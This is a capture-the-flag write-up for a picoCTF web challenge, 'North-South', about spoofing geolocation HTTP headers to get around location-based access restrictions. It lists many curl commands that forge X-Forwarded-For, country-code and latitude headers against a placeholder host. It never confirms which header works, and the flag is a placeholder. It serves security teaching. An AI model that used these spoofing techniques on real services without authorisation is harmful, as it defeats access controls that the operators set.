# North-South - picoCTF 2026

**Category:** Web Exploitation
**Points:** 100

## Challenge Description

I've set up geo-based routing - can you outsmart it? You're trying to retrieve the flag, but there's a catch: access to the flag is restricted based on geographic location headers.

## Approach

This is a **HTTP header spoofing** challenge. The web application uses client-supplied HTTP headers to determine the user's geographic location, then restricts access based on that location. Since these headers are set by the client (or by intermediate proxies), they can be easily forged.

### How Geo-Based Routing Works

Many web applications and CDNs use HTTP headers to determine a user's geographic location. Common headers include:

1. **`X-Forwarded-For`**: Set by proxies to indicate the original client IP. Geo-IP databases can map this to a location.
2. **`X-Real-IP`**: Similar to X-Forwarded-For, used by Nginx and other reverse proxies.
3. **`X-Forwarded-Country`** / **`CF-IPCountry`**: Explicitly states the country code (e.g., "US", "GB"). Set by CDNs like Cloudflare.
4. **`X-Country`** / **`X-Country-Code`**: Custom headers some applications use for country routing.
5. **`X-Geo-Location`** / **`X-Geo`**: Custom geolocation headers.
6. **`X-Forwarded-Latitude`** / **`X-Forwarded-Longitude`**: Some applications use latitude/longitude headers.
7. **`Accept-Language`**: While not geolocation, some apps use language preferences to infer location.

### The Vulnerability

The fundamental problem is that **the server trusts client-supplied headers** for security decisions. Any header that comes from the client can be forged. Even headers typically set by reverse proxies (like `X-Forwarded-For`) can be spoofed if the application does not properly strip or override them.

Given the challenge name "North-South," the restriction likely involves a directional/hemispheric constraint -- the server may require the request to appear to come from a specific hemisphere (e.g., the "North" or "South" hemisphere), a specific latitude range, or a specific country.

### Attack Strategy

1. Make a normal request to the challenge URL and observe the response (error message, redirect, or clue about what location is expected).
2. Try adding various geolocation headers to the request.
3. The challenge name "North-South" hints at latitude or hemisphere manipulation. Try headers that indicate northern or southern hemisphere locations.

## Solution

### Step 1: Reconnaissance

```bash
# Make a basic request to see the default response
curl -v http://CHALLENGE_URL/

# Check if there's a /flag endpoint or similar
curl -v http://CHALLENGE_URL/flag
```

The response will likely tell you that access is denied based on your location, or hint at what location is expected.

### Step 2: Try Common Geo Headers

```bash
# Try X-Forwarded-For with various IPs from different regions
curl -H "X-Forwarded-For: 8.8.8.8" http://CHALLENGE_URL/
curl -H "X-Forwarded-For: 1.1.1.1" http://CHALLENGE_URL/

# Try country code headers
curl -H "X-Forwarded-Country: US" http://CHALLENGE_URL/
curl -H "X-Country-Code: US" http://CHALLENGE_URL/
curl -H "CF-IPCountry: US" http://CHALLENGE_URL/

# Try explicit latitude/longitude headers
curl -H "X-Forwarded-Latitude: 40.7128" -H "X-Forwarded-Longitude: -74.0060" http://CHALLENGE_URL/

# Try with "North" or "South" values directly
curl -H "X-Geo-Location: North" http://CHALLENGE_URL/
curl -H "X-Geo-Location: South" http://CHALLENGE_URL/
curl -H "X-Region: North" http://CHALLENGE_URL/
curl -H "X-Region: South" http://CHALLENGE_URL/
```

### Step 3: Iterate Based on Server Responses

The server's error messages will guide you toward the correct header name and value. Common patterns:

```bash
# If the server expects a specific hemisphere
curl -H "X-Forwarded-For: 200.0.0.1" http://CHALLENGE_URL/  # South American IP
curl -H "X-Forwarded-For: 41.0.0.1" http://CHALLENGE_URL/    # African IP

# If the server checks a custom header
curl -H "X-Location: south" http://CHALLENGE_URL/
curl -H "X-Hemisphere: south" http://CHALLENGE_URL/
curl -H "X-Direction: south" http://CHALLENGE_URL/

# Multiple headers at once for a shotgun approach
curl \
  -H "X-Forwarded-For: 200.0.0.1" \
  -H "X-Forwarded-Country: BR" \
  -H "X-Country-Code: BR" \
  -H "CF-IPCountry: BR" \
  -H "X-Geo-Location: South" \
  -H "X-Region: South" \
  -H "X-Latitude: -23.5505" \
  -H "X-Longitude: -46.6333" \
  http://CHALLENGE_URL/
```

### Step 4: Retrieve the Flag

Once you find the correct header and value combination, the server will return the flag in its response.

## Solution Script
```
python3 solve.py
```

## Flag
```
picoCTF{...}  (placeholder - actual flag varies per instance)
```
